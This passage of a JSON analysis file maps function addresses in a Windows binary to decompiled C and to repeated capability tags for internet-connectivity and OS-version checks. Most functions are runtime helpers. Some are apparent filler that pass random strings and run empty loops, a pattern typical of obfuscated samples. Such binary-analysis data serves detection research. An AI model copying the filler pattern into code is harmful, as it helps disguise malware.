        "decompiled_code": "\nvoid __fastcall fcn.00404b33(int32_t param_1)\n\n{\n    uint16_t uVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint16_t *puVar4;\n    int32_t in_stack_ffffffdc;\n    int32_t var_10h;\n    uint var_ch;\n    uint32_t var_4h;\n    \n    var_4h = *0x571ca8 ^ &stack0xfffffffc;\n    if ((*(param_1 + 0x3c) == '\\0') || (*(param_1 + 0x38) < 1)) {\n        in_stack_ffffffdc = param_1 + 0xc;\n        fcn.00405ef2(*(param_1 + 0x34), *(param_1 + 0x38), param_1 + 0x18, in_stack_ffffffdc);\n    }\n    else {\n        puVar4 = *(param_1 + 0x34);\n        iVar3 = 0;\n        do {\n            uVar1 = *puVar4;\n            puVar4 = puVar4 + 1;\n            var_10h = 0;\n            iVar2 = fcn.00401f78(&var_10h, &var_ch, 6, uVar1, *(param_1 + 8));\n            if ((iVar2 != 0) || (var_10h == 0)) {\n                *(param_1 + 0x18) = 0xffffffff;\n                break;\n            }\n            fcn.00405ef2(&var_ch, var_10h, param_1 + 0x18, param_1 + 0xc);\n            iVar3 = iVar3 + 1;\n        } while (iVar3 != *(param_1 + 0x38));\n    }\n    fcn.004030bc(in_stack_ffffffdc);\n    return;\n}\n",
        "token_count": 413
    },
    "00404b47": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00404b47(uint *arg_8h)\n\n{\n    uint32_t uVar1;\n    uint *puVar2;\n    uint uVar3;\n    int32_t in_ECX;\n    \n    if (*(in_ECX + 0x45c) == 1) {\n        *(in_ECX + 0x14) = *(in_ECX + 0x14) + 4;\n        *arg_8h = *(*(in_ECX + 0x14) + -4);\n    }\n    else {\n        uVar1 = *(in_ECX + 0xaa8);\n        if (99 < uVar1) {\n            puVar2 = fcn.00403a35();\n            *puVar2 = 0x16;\n            fcn.004037ce();\n            return 0;\n        }\n        if (*(in_ECX + 0x458) == 1) {\n            uVar3 = fcn.004038a0(in_ECX + 0x464 + uVar1 * 0x10, 3, *(in_ECX + 0x32), *(in_ECX + 0x2c));\n            return uVar3;\n        }\n        *arg_8h = **(in_ECX + 0x46c + uVar1 * 0x10);\n    }\n    return 1;\n}\n",
        "token_count": 299
    },
    "00404ba1": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_14h\n\nvoid __cdecl fcn.00404ba1(uint arg_8h, uint arg_ch)\n\n{\n    int32_t in_ECX;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint32_t var_4h;\n    \n    var_4h = *0x571ca8 ^ &stack0xfffffffc;\n    var_14h = 0;\n    var_10h = 0;\n    fcn.00401fd7(&var_ch, arg_8h, &var_14h, in_ECX + 0x18);\n    fcn.004030bc(var_14h);\n    return;\n}\n",
        "token_count": 160
    },
    "00404bd3": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00404bd3(uint arg_8h)\n\n{\n    uint32_t uVar1;\n    int32_t iVar2;\n    uint *puVar3;\n    uint16_t in_FPUControlWord;\n    uint32_t var_20h;\n    uint var_4h;\n    \n    uVar1 = fcn.004df953(arg_8h);\n    puVar3 = &var_20h;\n    for (iVar2 = 7; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar3 = 0;\n        puVar3 = puVar3 + 1;\n    }\n    var_20h = var_20h & 0xffff0000 | in_FPUControlWord;\n    var_20h = var_20h ^ (uVar1 & 0xffff ^ var_20h) & 7999;\n    fcn.004df7ef(arg_8h);\n    return;\n}\n",
        "token_count": 212
    },
    "00404bec": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00404bec(int16_t *arg_8h)\n\n{\n    int16_t iVar1;\n    int16_t *piVar2;\n    int16_t **in_ECX;\n    uint32_t uVar3;\n    \n    if (*in_ECX != arg_8h) {\n        if (*in_ECX != NULL) {\n            fcn.00404179(*in_ECX);\n        }\n        *in_ECX = NULL;\n        if (arg_8h != NULL) {\n            iVar1 = *arg_8h;\n            piVar2 = arg_8h;\n            while (iVar1 != 0) {\n                piVar2 = piVar2 + 1;\n                iVar1 = *piVar2;\n            }\n            uVar3 = piVar2 + (2 - arg_8h) & 0xfffffffe;\n            piVar2 = fcn.00401596(uVar3);\n            *in_ECX = piVar2;\n            if (piVar2 != NULL) {\n                fcn.00405830(piVar2, arg_8h, uVar3);\n            }\n        }\n    }\n    return;\n}\n",
        "token_count": 251
    },
    "00404c00": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00404c00(char *arg_8h)\n\n{\n    char cVar1;\n    char *pcVar2;\n    char **in_ECX;\n    char *pcVar3;\n    \n    if (*in_ECX != arg_8h) {\n        if (*in_ECX != NULL) {\n            fcn.00404179(*in_ECX);\n        }\n        *in_ECX = NULL;\n        if (arg_8h != NULL) {\n            cVar1 = *arg_8h;\n            pcVar3 = arg_8h;\n            while (cVar1 != '\\0') {\n                pcVar3 = pcVar3 + 1;\n                cVar1 = *pcVar3;\n            }\n            pcVar2 = fcn.00401596(pcVar3 + (1 - arg_8h));\n            *in_ECX = pcVar2;\n            if (pcVar2 != NULL) {\n                fcn.00405830(pcVar2, arg_8h, pcVar3 + (1 - arg_8h));\n            }\n        }\n    }\n    return;\n}\n",
        "token_count": 240
    },
    "00404c14": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint32_t fcn.00404c14(void)\n\n{\n    int32_t in_FS_OFFSET;\n    int32_t var_4h;\n    \n    if (*0x575490 == 0) {\n        var_4h = 1;\n        if ((*(*(*(in_FS_OFFSET + 0x30) + 0x10) + 8) < 0) || (fcn.00402d24(&var_4h),  *0x575490 = 1,  var_4h == 1)) {\n            *0x575490 = 2;\n        }\n    }\n    return *0x575490;\n}\n",
        "token_count": 138
    },
    "00404c8c": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00404c8c(uint arg_8h, uint arg_ch)\n\n{\n    char cVar1;\n    uint *puVar2;\n    uint var_18h;\n    char *var_10h;\n    uint var_ch;\n    int32_t var_8h;\n    uint var_4h;\n    \n    fcn.00405af1(arg_ch);\n    cVar1 = **0x574458;\n    if (cVar1 == '\\0') {\n        fcn.004017df(1);\n    }\n    else {\n        if (cVar1 == '?') {\n            *0x574458 = *0x574458 + 1;\n            var_10h = NULL;\n            var_ch = 0;\n            puVar2 = fcn.004013cf(&var_18h, &var_8h, 0, &var_10h, 0);\n            var_8h = *puVar2;\n            var_4h = puVar2[1];\n            fcn.00403693(arg_8h, &var_8h);\n            return arg_8h;\n        }\n        if (cVar1 != 'X') {\n            fcn.00403693(arg_8h, &var_8h);\n            return arg_8h;\n        }\n        *0x574458 = *0x574458 + 1;\n        if (var_8h == 0) {\n            var_10h = \"void\";\n            var_ch = 4;\n            fcn.00402d47(&var_10h);\n            return arg_8h;\n        }\n        var_10h = \"void \";\n        var_ch = 5;\n        fcn.00402d47(&var_10h);\n    }\n    fcn.004053b7(arg_8h, &var_8h);\n    return arg_8h;\n}\n",
        "token_count": 411
    },
    "00404cd7": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00404cd7(char *arg_8h)\n\n{\n    int32_t arg_ch;\n    uint *in_ECX;\n    \n    arg_ch = 0;\n    *in_ECX = 0;\n    in_ECX[1] = 0;\n    if ((arg_8h != NULL) && (*arg_8h != '\\0')) {\n        do {\n            arg_ch = arg_ch + 1;\n        } while (arg_8h[arg_ch] != '\\0');\n        if (arg_ch != 0) {\n            fcn.00401ab9(arg_8h, arg_ch);\n        }\n    }\n    return;\n}\n",
        "token_count": 144
    },
    "00404ceb": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00404ceb(uint arg_8h)\n\n{\n    int32_t *in_FS_OFFSET;\n    uint var_70h;\n    int32_t var_6ch;\n    int32_t var_68h;\n    uint var_60h;\n    uint var_48h;\n    uint var_2ch;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    int32_t var_18h;\n    uint var_14h;\n    uint var_10h;\n    \n    var_14h = 0x451640;\n    var_18h = *in_FS_OFFSET;\n    *in_FS_OFFSET = &var_18h;\n    var_10h = 0;\n    fcn.00401e79(\"joqjldfyesqspraxqsunlnpenmzrvbsmxlfeob\");\n    var_10h = 1;\n    fcn.00401e79(\"xdhkxayvqawxyrsjrspdkwldodopbukrk\");\n    for (var_68h = 0x62; 0 < var_68h; var_68h = var_68h + -1) {\n    }\n    for (var_6ch = 0x1e; 0 < var_6ch; var_6ch = var_6ch + -1) {\n    }\n    fcn.00403b02();\n    fcn.00403b02();\n    fcn.00403b02();\n    *in_FS_OFFSET = var_18h;\n    return;\n}\n",
        "token_count": 347
    },
    "00404cfa": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint * __cdecl fcn.00404cfa(uint *arg_8h, int32_t *arg_ch, int32_t *arg_10h, int32_t arg_14h)\n\n{\n    char cVar1;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    var_10h = *(arg_14h * 8 + 0x554f58);\n    var_ch = *(arg_14h * 8 + 0x554f5c);\n    cVar1 = **0x574458;\n    if (cVar1 == '\\0') {\n        fcn.004017df(1);\n        fcn.00405d71(&var_10h);\n        if (*arg_ch != 0) {\n            fcn.00402eeb(arg_ch);\n        }\n        if (*arg_10h != 0) {\n            if (*arg_ch != 0) {\n                fcn.00403d55(0x20);\n            }\n            fcn.00402eeb(arg_10h);\n        }\n        *arg_8h = var_8h;\n        arg_8h[1] = var_4h;\n    }\n    else if (((cVar1 < '6') || ('9' < cVar1)) && (cVar1 != '_')) {\n        fcn.004013cf(&var_10h, arg_10h, arg_14h, arg_ch, 0);\n        fcn.00405132(arg_8h, &var_10h, arg_14h == 1);\n    }\n    else {\n        fcn.00402d47(&var_10h);\n        if ((*arg_ch != 0) && ((*arg_10h == 0 || ((arg_10h[1] & 0x100U) == 0)))) {\n            fcn.00402eeb(arg_ch);\n        }\n        if (*arg_10h != 0) {\n            fcn.00402eeb(arg_10h);\n        }\n        fcn.00406965(arg_8h, &var_8h);\n    }\n    return arg_8h;\n}\n",
        "token_count": 479
    },
    "00404d4f": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nint16_t * fcn.00404d4f(void)\n\n{\n    int16_t iVar1;\n    code *pcVar2;\n    int16_t **ppiVar3;\n    int16_t *piVar4;\n    int16_t *piVar5;\n    int16_t *piVar6;\n    int32_t iVar7;\n    int16_t **ppiVar8;\n    int16_t *piVar9;\n    int32_t iVar10;\n    int32_t var_1ch;\n    int32_t var_18h;\n    uint var_10h;\n    uint32_t var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    iVar7 = 0;\n    fcn.004058a8(0);\n    iVar10 = 0xc;\n    ppiVar3 = *(var_18h + 0x9c) + 0x11c;\n    ppiVar8 = ppiVar3;\n    do {\n        piVar6 = ppiVar8[-0xc];\n        piVar4 = piVar6 + 1;\n        do {\n            iVar1 = *piVar6;\n            piVar6 = piVar6 + 1;\n        } while (iVar1 != 0);\n        piVar5 = *ppiVar8;\n        piVar9 = piVar5 + 1;\n        do {\n            iVar1 = *piVar5;\n            piVar5 = piVar5 + 1;\n        } while (iVar1 != 0);\n        ppiVar8 = ppiVar8 + 1;\n        iVar7 = iVar7 + 2 + (piVar5 - piVar9 >> 1) + (piVar6 - piVar4 >> 1);\n        iVar10 = iVar10 + -1;\n    } while (iVar10 != 0);\n    piVar4 = fcn.0040409d(iVar7 * 2 + 2);\n    if (piVar4 == NULL) {\n        piVar4 = NULL;\n    }\n    else {\n        var_ch = 0;\n        piVar6 = piVar4;\n        do {\n            *piVar6 = 0x3a;\n            piVar9 = piVar6 + 1;\n            iVar10 = fcn.00403977(piVar9, (iVar7 - (piVar9 - piVar4 >> 1)) + 1, ppiVar3[-0xc]);\n            if (iVar10 != 0) {\ncode_r0x004be56d:\n                fcn.0040366b(0, 0, 0, 0, 0);\n                pcVar2 = swi(3);\n                piVar4 = (*pcVar2)();\n                return piVar4;\n            }\n            piVar5 = piVar9;\n            do {\n                iVar1 = *piVar5;\n                piVar5 = piVar5 + 1;\n            } while (iVar1 != 0);\n            piVar9 = piVar9 + (piVar5 - (piVar6 + 2) >> 1);\n            *piVar9 = 0x3a;\n            piVar6 = piVar9 + 1;\n            iVar10 = fcn.00403977(piVar6, (iVar7 - (piVar6 - piVar4 >> 1)) + 1, *ppiVar3);\n            if (iVar10 != 0) goto code_r0x004be56d;\n            piVar5 = piVar6;\n            do {\n                iVar1 = *piVar5;\n                piVar5 = piVar5 + 1;\n            } while (iVar1 != 0);\n            ppiVar3 = ppiVar3 + 1;\n            piVar6 = piVar6 + (piVar5 - (piVar9 + 2) >> 1);\n            var_ch = var_ch + 1;\n        } while (var_ch < 0xc);\n        *piVar6 = 0;\n    }\n    fcn.0040640b(0);\n    if (var_10h != '\\0') {\n        *(var_1ch + 0x350) = *(var_1ch + 0x350) & 0xfffffffd;\n    }\n    return piVar4;\n}\n",
        "token_count": 931
    },
    "00404d63": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00404d63(uint *arg_8h)\n\n{\n    uint32_t uVar1;\n    uint *puVar2;\n    uint uVar3;\n    int32_t in_ECX;\n    \n    if (*(in_ECX + 0x45c) == 1) {\n        *(in_ECX + 0x14) = *(in_ECX + 0x14) + 4;\n        *arg_8h = *(*(in_ECX + 0x14) + -4);\n    }\n    else {\n        uVar1 = *(in_ECX + 0xaa8);\n        if (99 < uVar1) {\n            puVar2 = fcn.00403a35();\n            *puVar2 = 0x16;\n            fcn.004037ce();\n            return 0;\n        }\n        if (*(in_ECX + 0x458) == 1) {\n            uVar3 = fcn.004028c4(in_ECX + 0x464 + uVar1 * 0x10, 3, *(in_ECX + 0x31), *(in_ECX + 0x2c));\n            return uVar3;\n        }\n        *arg_8h = **(in_ECX + 0x46c + uVar1 * 0x10);\n    }\n    return 1;\n}\n",
        "token_count": 299
    },
    "00404d86": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nfloat10 __cdecl fcn.00404d86(uint arg_8h)\n\n{\n    int32_t iStack48;\n    \n    for (iStack48 = 0x62; 0 < iStack48; iStack48 = iStack48 + -1) {\n    }\n    fcn.00403b02();\n    return *0x5473c4;\n}\n",
        "token_count": 81
    },
    "00404dc7": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_24h\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.00404dc7(uint32_t arg_8h, uint8_t *arg_ch, uint32_t arg_10h, uint32_t *arg_14h)\n\n{\n    uint8_t uVar1;\n    uint32_t uVar2;\n    uint8_t uVar4;\n    uint32_t uVar3;\n    uint32_t uVar5;\n    uint8_t *puVar6;\n    uint32_t *puVar7;\n    uint var_24h;\n    uint var_20h;\n    uint32_t var_1ch;\n    uint32_t var_18h;\n    char var_13h;\n    uint8_t var_12h;\n    char var_11h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint32_t var_4h;\n    \n    var_4h = *0x571ca8 ^ &stack0xfffffffc;\n    if (arg_14h == NULL) {\n        arg_14h = 0x57570c;\n    }\n    puVar6 = arg_ch;\n    if (arg_ch == NULL) {\n        arg_10h = 1;\n        puVar6 = 0x552647;\n    }\n    puVar7 = -(arg_ch != NULL) & arg_8h;\n    if (arg_10h == 0) goto code_r0x004e0faa;\n    if (*(arg_14h + 6) == 0) {\n        var_12h = *puVar6;\n        puVar6 = puVar6 + 1;\n        if (-1 < var_12h) {\n            if (puVar7 != NULL) {\n                *puVar7 = var_12h;\n            }\n            goto code_r0x004e0faa;\n        }\n        if ((var_12h & 0xe0) == 0xc0) {\n            var_11h = '\\x02';\n        }\n        else if ((var_12h & 0xf0) == 0xe0) {\n            var_11h = '\\x03';\n        }\n        else {\n            if ((var_12h & 0xf8) != 0xf0) goto code_r0x004e0fa3;\n            var_11h = '\\x04';\n        }\n        var_13h = var_11h;\n        uVar3 = CONCAT11(var_11h, var_11h);\n        uVar5 = (1 << (7U - var_11h & 0x1f)) - 1U & var_12h;\ncode_r0x004e0ef7:\n        uVar2 = uVar3 >> 8;\n        var_1ch = arg_10h;\n        if (uVar2 < arg_10h) {\n            var_1ch = uVar2;\n        }\n        var_18h = puVar6 - arg_ch;\n        while (var_18h < var_1ch) {\n            uVar1 = *puVar6;\n            puVar6 = puVar6 + 1;\n            var_18h = var_18h + 1;\n            if ((uVar1 & 0xc0) != 0x80) goto code_r0x004e0fa3;\n            uVar5 = uVar5 << 6 | uVar1 & 0x3f;\n        }\n        if (var_1ch < uVar2) {\n            *(arg_14h + 1) = uVar3;\n            *arg_14h = uVar5;\n            *(arg_14h + 6) = (uVar3 >> 8) - var_1ch;\n            goto code_r0x004e0faa;\n        }\n        if (((uVar5 < 0xd800) || (0xdfff < uVar5)) && (uVar5 < 0x110000)) {\n            var_10h = 0x80;\n            var_ch = 0x800;\n            var_8h = 0x10000;\n            if ((&var_18h)[uVar3 & 0xff] <= uVar5) {\n                if (puVar7 != NULL) {\n                    *puVar7 = uVar5;\n                }\n                *arg_14h = 0;\n                arg_14h[1] = 0;\n                goto code_r0x004e0faa;\n            }\n        }\n    }\n    else {\n        uVar1 = *(arg_14h + 1);\n        uVar5 = *arg_14h;\n        uVar3 = CONCAT11(*(arg_14h + 6), uVar1);\n        if (((uVar1 - 2 < 3) && (uVar4 = uVar3 >> 8,  uVar4 != 0)) && (uVar4 < uVar1)) goto code_r0x004e0ef7;\n    }\ncode_r0x004e0fa3:\n    fcn.00402617(arg_14h);\ncode_r0x004e0faa:\n    fcn.004030bc(arg_ch);\n    return;\n}\n",
        "token_count": 1148
    },
    "00404e58": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nulong __fastcall fcn.00404e58(int32_t param_1)\n\n{\n    if (*(param_1 + 4) != '\\0') {\n        return 0xfffffffffffff;\n    }\n    return 0x7fffff;\n}\n",
        "token_count": 54
    },
    "00404e85": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint fcn.00404e85(void)\n\n{\n    int32_t iStack44;\n    \n    for (iStack44 = 0x15; 0 < iStack44; iStack44 = iStack44 + -1) {\n    }\n    return 0xfc8;\n}\n",
        "token_count": 62
    },
    "00404e8f": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuchar __fastcall fcn.00404e8f(int32_t param_1)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    char cVar3;\n    uint *puVar4;\n    int32_t iVar5;\n    int32_t *piVar6;\n    bool bVar7;\n    \n    cVar3 = fcn.0040428c();\n    if (cVar3 == '\\0') {\n        return 0;\n    }\n    if ((*(param_1 + 0x45c) == 2) && (*(param_1 + 0x458) == 1)) {\n        iVar1 = *(param_1 + 0xaa4);\n        if (param_1 != param_1 + (iVar1 * 4 + 4) * 4) {\n            iVar5 = *(param_1 + 0x14);\n            piVar6 = param_1 + 0x464;\n            do {\n                iVar2 = *piVar6;\n                piVar6[2] = iVar5;\n                if (iVar2 == 1) {\ncode_r0x004a8ae8:\n                    *(param_1 + 0x14) = *(param_1 + 0x14) + 4;\n                }\n                else {\n                    if (iVar2 != 2) {\n                        if (iVar2 == 3) goto code_r0x004a8ae8;\n                        if (iVar2 != 4) {\n                            puVar4 = fcn.00403a35();\n                            *puVar4 = 0x16;\n                            fcn.004037ce();\n                            return 0;\n                        }\n                    }\n                    *(param_1 + 0x14) = *(param_1 + 0x14) + 8;\n                }\n                iVar5 = *(param_1 + 0x14);\n                bVar7 = piVar6 != param_1 + (iVar1 * 4 + 0x119) * 4;\n                piVar6 = piVar6 + 4;\n            } while (bVar7);\n        }\n    }\n    return 1;\n}\n",
        "token_count": 459
    },
    "00404e9e": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n\nvoid __cdecl fcn.00404e9e(uint arg_8h)\n\n{\n    int32_t **in_FS_OFFSET;\n    int32_t iStack120;\n    int32_t iStack116;\n    int32_t *piStack32;\n    uint uStack28;\n    uint uStack24;\n    uint var_ch;\n    \n    uStack28 = 0x450b20;\n    piStack32 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &piStack32;\n    uStack24 = 1;\n    fcn.00401e79(\"hutskxhjcvs\");\n    uStack24 = 2;\n    fcn.00401e79(\"ztgfcnscexahhopckqbwoqxqbrxgqxrjigneasmbwcumngntbcntshezuqterlrmwpmsdchsfqdvcmn\");\n    for (iStack116 = 6; 0 < iStack116; iStack116 = iStack116 + -1) {\n    }\n    for (iStack120 = 0x2e; 0 < iStack120; iStack120 = iStack120 + -1) {\n    }\n    fcn.00403b02();\n    fcn.00403b02();\n    fcn.00403b02();\n    fcn.00403b02();\n    *in_FS_OFFSET = piStack32;\n    return;\n}\n",
        "token_count": 318
    },
    "00404ea8": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.00404ea8(int32_t *arg_8h)\n\n{\n    char cVar1;\n    uint *puVar2;\n    uint32_t uVar3;\n    int32_t in_ECX;\n    \n    if (*(in_ECX + 0x45c) == 1) {\n        *(in_ECX + 0x14) = *(in_ECX + 0x14) + 4;\n        cVar1 = *(*(in_ECX + 0x14) + -4);\n    }\n    else {\n        uVar3 = *(in_ECX + 0xaa8);\n        if (99 < uVar3) {\n            puVar2 = fcn.00403a35();\n            *puVar2 = 0x16;\n            uVar3 = fcn.004037ce();\n            return uVar3 & 0xffffff00;\n        }\n        if (*(in_ECX + 0x458) == 1) {\n            uVar3 = fcn.004028c4(in_ECX + 0x464 + uVar3 * 0x10, 1, *(in_ECX + 0x31), *(in_ECX + 0x2c));\n            return uVar3;\n        }\n        cVar1 = **(in_ECX + 0x46c + uVar3 * 0x10);\n    }\n    *arg_8h = cVar1;\n    arg_8h[1] = cVar1 >> 0x1f;\n    return CONCAT31(cVar1 >> 7, 1);\n}\n",
        "token_count": 348
    },
    "00404ed5": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl\nfcn.00404ed5(uint *arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint noname_4, uint arg_1ch, uint32_t *arg_20h, \n            double *arg_24h)\n\n{\n    uint32_t *puVar1;\n    double *pdVar2;\n    char cVar3;\n    uint arg_10h_00;\n    uint in_ECX;\n    uint unaff_EBX;\n    float10 fVar4;\n    int32_t var_328h;\n    uint *var_324h;\n    int32_t var_320h;\n    uint var_31ch;\n    uint32_t var_4h;\n    \n    pdVar2 = arg_24h;\n    puVar1 = arg_20h;\n    var_4h = *0x571ca8 ^ &stack0xfffffffc;\n    var_320h = 1000000000;\n    arg_10h_00 = fcn.00403cec(in_ECX, &var_31ch, &arg_ch, &arg_14h, arg_1ch, &var_320h);\n    if (var_31ch == '\\0') {\ncode_r0x00468cd5:\n        fVar4 = 0;\n        *puVar1 = 2;\n    }\n    else {\n        fVar4 = fcn.00405ff6(&var_31ch, &var_324h, arg_10h_00, &var_328h);\n        *pdVar2 = fVar4;\n        if ((var_324h == &var_31ch) || (var_328h != 0)) goto code_r0x00468cd5;\n        if ((var_320h == 1000000000) || (var_320h == 0)) goto code_r0x00468ce1;\n        fVar4 = fcn.00402bf3(SUB84(fVar4, 0), fVar4 >> 0x20, var_320h << 2);\n    }\n    *pdVar2 = fVar4;\ncode_r0x00468ce1:\n    cVar3 = fcn.00404011(&arg_14h);\n    if (cVar3 != '\\0') {\n        *puVar1 = *puVar1 | 1;\n    }\n    *arg_8h = arg_ch;\n    arg_8h[1] = arg_10h;\n    fcn.004030bc(unaff_EBX);\n    return;\n}\n",
        "token_count": 567
    },
    "00404f70": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
